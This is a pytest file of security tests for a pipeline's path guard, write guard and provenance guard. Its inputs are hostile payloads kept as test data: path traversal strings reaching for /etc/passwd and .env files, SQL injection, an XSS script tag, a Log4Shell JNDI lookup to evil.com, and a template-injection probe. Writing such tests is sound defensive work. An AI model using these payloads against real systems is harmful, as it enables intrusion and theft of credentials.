"""
Security baseline tests for Example Reviewer Pipeline.

Validates that path guards, provenance guards, and input handling
resist adversarial inputs (path traversal, injection, etc.).
"""

import pytest
from pathlib import Path
from unittest.mock import MagicMock

from src.core.path_guard import (
    is_read_only_path,
    assert_write_allowed,
    normalize_path,
)
from src.core.provenance_guard import (
    validate_provenance,
    ProvenanceViolationError,
)
from src.core.models import ExampleRecord, ExampleStatus


# ---------------------------------------------------------------------------
# Path traversal attacks on path_guard
# ---------------------------------------------------------------------------

class TestPathTraversalGuard:
    """Verify path_guard blocks directory traversal attempts."""

    @pytest.mark.parametrize("malicious_path", [
        "test-data/../../../etc/passwd",
        "test-data/../../secrets.env",
        "test-examples/../../../../tmp/evil",
        "tests/fixtures/content/../../../.env",
    ])
    def test_traversal_paths_still_detected_as_readonly(self, malicious_path):
        """Paths starting with read-only prefixes are blocked even with traversal."""
        assert is_read_only_path(malicious_path) is True

    @pytest.mark.parametrize("malicious_path", [
        "../test-data/file.txt",
        "../../test-data/file.txt",
    ])
    def test_relative_traversal_outside_root_not_readonly(self, malicious_path):
        """Relative paths going above root are not in read-only zone."""
        # These paths don't start with a read-only prefix
        result = is_read_only_path(malicious_path)
        # The guard should handle these — either block or pass depending on normalization
        assert isinstance(result, bool)

    def test_null_byte_in_path(self):
        """Null bytes in paths should not bypass guards."""
        path = "test-data/\x00../../etc/passwd"
        result = is_read_only_path(path)
        assert result is True  # Still starts with test-data/

    def test_backslash_traversal(self):
        """Windows-style backslash traversal should be normalized."""
        path = "test-data\\..\\..\\secrets"
        normalized = normalize_path(path)
        assert "\\" not in normalized

    def test_unicode_normalization(self):
        """Unicode characters in paths should not bypass guards."""
        path = "test-data/\u202e\u2066file.txt"
        result = is_read_only_path(path)
        assert result is True


class TestWriteGuardEnforcement:
    """Verify assert_write_allowed raises on protected paths."""

    def test_write_to_test_data_blocked(self):
        with pytest.raises(PermissionError, match="WRITE BLOCKED"):
            assert_write_allowed("test-data/sample.zip", "test write")

    def test_write_to_test_examples_blocked(self):
        with pytest.raises(PermissionError, match="WRITE BLOCKED"):
            assert_write_allowed("test-examples/doc.md", "test write")

    def test_write_to_fixtures_content_blocked(self):
        with pytest.raises(PermissionError, match="WRITE BLOCKED"):
            assert_write_allowed("tests/fixtures/content/page.md", "test write")

    def test_write_to_workspace_allowed(self):
        # Should not raise
        assert_write_allowed("workspace/output.txt", "compilation artifact")

    def test_write_to_artifacts_allowed(self):
        assert_write_allowed("artifacts/backfill/zip/test-data/file.txt", "backfill")


# ---------------------------------------------------------------------------
# Provenance guard — rejects unverified updates
# ---------------------------------------------------------------------------

class TestProvenanceGuard:
    """Verify provenance guard rejects unverified example updates."""

    def _make_example(self, status, verified_code=None):
        """Create a mock ExampleRecord."""
        mock = MagicMock(spec=ExampleRecord)
        mock.example_id = "test-example-001"
        mock.status = status
        mock.verified_code = verified_code
        mock.file_path = "docs/test.md"
        mock.location = MagicMock()
        mock.location.block_index = 0
        mock.original_code = "Console.WriteLine();"
        mock.compilable_code = verified_code
        return mock

    def test_rejects_example_without_verified_code(self):
        example = self._make_example(ExampleStatus.VERIFIED, verified_code=None)
        with pytest.raises(ProvenanceViolationError, match="no verified_code"):
            validate_provenance(example)

    def test_rejects_unverified_status(self):
        example = self._make_example(
            ExampleStatus.DISCOVERED,
            verified_code="Console.WriteLine();"
        )
        with pytest.raises(ProvenanceViolationError, match="status"):
            validate_provenance(example, require_verified=True)

    def test_accepts_verified_example(self):
        example = self._make_example(
            ExampleStatus.VERIFIED,
            verified_code="Console.WriteLine();"
        )
        signal = validate_provenance(example)
        assert signal.example_id == "test-example-001"
        assert signal.verified_code_hash is not None

    def test_accepts_md_updated_status(self):
        example = self._make_example(
            ExampleStatus.MD_UPDATED,
            verified_code="Console.WriteLine();"
        )
        signal = validate_provenance(example)
        assert signal.verification_status == ExampleStatus.MD_UPDATED


# ---------------------------------------------------------------------------
# Input sanitization — SQL-like payloads in example IDs
# ---------------------------------------------------------------------------

class TestInputSanitization:
    """Verify that adversarial inputs don't cause unexpected behavior."""

    @pytest.mark.parametrize("evil_input", [
        "'; DROP TABLE examples; --",
        "\" OR 1=1 --",
        "<script>alert('xss')</script>",
        "${jndi:ldap://evil.com/a}",
        "{{7*7}}",
    ])
    def test_normalize_path_handles_adversarial_input(self, evil_input):
        """normalize_path should not crash on adversarial strings."""
        result = normalize_path(evil_input)
        assert isinstance(result, str)
